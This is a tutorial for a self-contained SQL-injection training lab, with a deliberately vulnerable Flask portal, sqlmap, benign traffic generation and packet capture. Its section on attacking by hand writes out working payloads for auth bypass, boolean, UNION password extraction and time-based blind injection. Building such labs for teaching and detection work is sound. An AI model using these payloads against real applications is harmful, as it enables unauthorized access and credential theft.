# Cardinal Phase 1 — Tutorial

A step-by-step walkthrough of the SQL-injection lab: start it, browse the portal,
generate benign traffic, run the attacks (automated **and** by hand in your
browser), and find the captured evidence.

- **What's in scope:** this tutorial walks the **SQL injection** flows (login +
  directory search), with a benign twin on every route. The webapp also exposes
  the **XSS** sinks (reflected on `/search`, stored on `/profile` and
  `/records/<id>`) and the **insecure-deserialization** import (`/settings`,
  forwarded to `desersvc`) — see the README's "XSS and deserialization surfaces"
  for how to exercise those. Dedicated XSS/deser *attacker tooling* (XSStrike,
  ysoserial/pickle) is a later-phase add; the WAF and IDS stack remain deferred.
- **Credentials:** `alice` / `alicepw`, `bob` / `bobpw`, `carol` / `carolpw`.
- **Default mode is vulnerable** (`SQL_MODE=concat`); add `?impl=param` to any
  request to run the safe (parameterized) path instead.

---

## 0. Where things live (read this first)

| Artifact | Node | Path | When it appears |
|---|---|---|---|
| **Packet captures (pcap)** | `monitor` | `/captures/edge-net_*.pcap`, `/captures/app-net_*.pcap` | continuously, from boot |
| **Live HTTP log** | `monitor` | `/captures/http_live.log` | continuously, from boot |
| **sqlmap output + dumps** | `attacker` | `/tmp/sqlmap-output/` | only **after** you run `/scripts/run_sqli.sh` |
| **sqlmap console log** | `attacker` | `/tmp/sqlmap-results.log` | only after `run_sqli.sh` |

> The pcaps are **not** on the attacker node. The attacker's `/tmp` is empty
> until you actually launch `run_sqli.sh`.

---

## 1. Build the images (one time)

```bash
cd sql-injection
./build-images.sh          # builds the 6 cardinal/* images; re-run after editing any images/*/Dockerfile
```

## 2. Start the lab and publish the web UIs

```bash
kathara lstart --noterminals   # boots all 6 nodes (~30s; the DB seeds itself on boot)
./expose-ui.sh             # publishes portal -> http://localhost:8080, Locust -> http://localhost:8089
```

`expose-ui.sh` is needed on **Docker Desktop** (Mac/Windows), where Kathara's own
host-port publishing doesn't work; it runs two small `socat` sidecars. Re-run it
any time after `lstart`. On native-Linux Kathara you can instead use the
`proxy[port]` / `locust[port]` options and skip it.

Check everything is up:

```bash
docker ps --format '{{.Names}}\t{{.Status}}' | grep -E '_(proxy|webapp|db|locust|attacker|monitor)_'
curl -s -o /dev/null -w 'portal %{http_code}\n' http://localhost:8080/login   # expect 200
```

## 3. Explore the portal (the system under test)

Open **http://localhost:8080** and:

- Log in as `alice` / `alicepw`.
- Use **Directory** to search (e.g. `Alice`, `Engineering`) and click a person.
- Notice the results page prints the **exact SQL it executed** — handy for seeing
  what your input did to the query.

## 4. Start benign background traffic (Locust)

Open **http://localhost:8089**:

1. **Number of users:** `10`  2. **Spawn rate:** `2`  3. host is already
   `http://172.30.0.10` → **Start**.

This is the ambient "employees using the app" noise the attack must hide in.
Leave it running.

## 5. Watch the monitor (own terminal)

```bash
kathara connect monitor
tail -f /captures/http_live.log
```

You'll see live HTTP on **both** segments — `172.30.x` (client → proxy) and
`172.31.x` (proxy → webapp). Full pcaps grow in `/captures/`.

---

## 6. Attack A — automated (from the attacker node)

Open another terminal:

```bash
kathara connect attacker

# Fast, hand-crafted payloads (auth bypass, UNION, error, time-based, stacked, baseline):
/scripts/manual_payloads.sh

# Full automated attack: sqlmap fingerprints MariaDB and dumps the tables (~1 min):
/scripts/run_sqli.sh
```

While these run, watch the monitor terminal (step 5): the injection payloads
appear **interleaved with Locust's benign requests on the same `/search` and
`/login` endpoints** — same route, different intent.

After `run_sqli.sh`, the loot is on the attacker node:

```bash
ls /tmp/sqlmap-output/172.30.0.10/dump/portal/     # users.csv, directory.csv, comments.csv
cat /tmp/sqlmap-output/172.30.0.10/dump/portal/users.csv   # includes plaintext passwords
```

---

## 7. Attack B — by hand, from the browser (no tools)

Every attack the scripts send is just an HTTP request, so you can do them
yourself in the portal at **http://localhost:8080**. The results page even shows
you the SQL that ran.

### 7a. Auth bypass (login form)

- Go to **Log in**. Username: `' OR '1'='1' -- -`  Password: anything.
- **Expect:** you're logged in (as the first user, Alice) and redirected to a
  profile — no valid password needed.
- **Safe twin:** the app defaults to vulnerable. There's no per-request toggle on
  the HTML login form, but the equivalent safe request rejects it — try it with
  curl: `curl -i -X POST 'http://localhost:8080/login?impl=param' --data-urlencode "username=' OR '1'='1' -- -" --data-urlencode 'password=x'` → **401**.

### 7b. Boolean injection (search box)

- In **Directory**, search for: `' OR '1'='1`
- **Expect:** the whole directory (all 17 people) comes back even though that's
  not a real name. The page shows the executed SQL with your `OR '1'='1'` clause.
- **Safe twin:** append `&impl=param` to the URL (e.g.
  `http://localhost:8080/search?q=' OR '1'='1&impl=param`) → **0 results**; the
  input is treated as a literal name.

### 7c. Read passwords with UNION (search box)

- Search for:
  `zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -`
- **Expect:** rows whose **Name** column shows usernames and **Title** column
  shows their **passwords** (`alicepw`, `bobpw`, `carolpw`). The search selects 7
  columns, so the UNION must supply 7 — the columns map onto the visible table.

### 7d. Time-based blind (search box or URL)

- Search for: `zzz' UNION SELECT SLEEP(3),2,3,4,5,6,7-- -`
- **Expect:** the page hangs for ~3 seconds before responding — proof the DB ran
  your `SLEEP(3)`. A normal search returns in milliseconds.

### 7e. Error-based payload (what to expect, and its limit)

- Search for the error-based payload (the long `... COUNT(*),CONCAT(... FLOOR(RAND(0)*2)) ...`
  from `manual_payloads.sh`).
- **Expect:** an HTTP **500** page — the payload reaches the DB and breaks the
  query. But it does **not** leak data here: the app returns a generic 500 with
  no SQL error text, so classic error-based *extraction* has nothing to read.
  (Realistic: production apps hide DB errors. UNION and blind techniques still
  work, which is why sqlmap uses those.)

### 7f. Stacked query (what to expect)

- Search for: `'; SELECT * FROM users WHERE '1'='1`
- **Expect:** HTTP **500**. The driver (PyMySQL) executes a single statement, so
  a second stacked statement is rejected — a useful negative result.

### Quick reference — browser payloads

| Where | Type in | Expect |
|---|---|---|
| Login → Username | `' OR '1'='1' -- -` | logged in without a password |
| Directory search | `' OR '1'='1` | all 17 people returned |
| Directory search | `zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -` | usernames + **passwords** in the table |
| Directory search | `zzz' UNION SELECT SLEEP(3),2,3,4,5,6,7-- -` | ~3s delay |
| URL, any search | add `&impl=param` | injection neutralized (safe path) |

> Comment style: use `-- -` (dash, space, dash) in the search box and login form.
> Don't use `#` in the browser URL bar — the browser treats `#` as a fragment and
> won't send it to the server.

---

## 8. Save the evidence (before teardown)

pcaps live inside the `monitor` container and are lost on `lclean`, so copy them
to your machine first:

```bash
docker cp "$(docker ps --format '{{.Names}}' | grep _monitor_)":/captures ./pcaps
# open ./pcaps/*.pcap in Wireshark, or:
#   tshark -r ./pcaps/edge-net_*.pcap -Y http.request -T fields -e ip.src -e http.request.uri
```

Grab the sqlmap dumps too, if you ran it:

```bash
docker cp "$(docker ps --format '{{.Names}}' | grep _attacker_)":/tmp/sqlmap-output ./sqlmap-output
```

## 9. Tear down

```bash
kathara lclean
docker rm -f cardinal-webapp-ui cardinal-locust-ui
```

---

## Reference

**Topology (two L2 segments; only the proxy bridges them):**

| Node | edgenet | appnet | Role |
|---|---|---|---|
| proxy | 172.30.0.10 | 172.31.0.10 | Coraza WAF (OWASP CRS) + reverse proxy (choke point) |
| locust | 172.30.0.20 | — | benign traffic |
| attacker | 172.30.0.30 | — | sqlmap / curl |
| webapp | — | 172.31.0.20 | Flask app (gunicorn :5000) |
| db | — | 172.31.0.30 | MariaDB (`portal` DB) |
| monitor | 172.30.0.99 | 172.31.0.99 | passive capture |

**Routes / toggle:**

| Route | SQLi surface | Toggle |
|---|---|---|
| `POST /login` | auth bypass (concat) | `?impl=param` for safe |
| `GET /search?q=` | boolean / UNION / time-based (concat) | `?impl=param` for safe |
| `GET /profile/<id>` | none — parameterized control route | — |

**Choke point:** from the attacker, the app and data tiers are **unreachable
directly** — only the proxy is:

```bash
kathara connect attacker
curl --max-time 4 http://172.31.0.20:5000/   # webapp: fails
curl --max-time 4 http://172.31.0.30:3306/   # db: fails
curl http://172.30.0.10/healthz              # proxy: 200
```
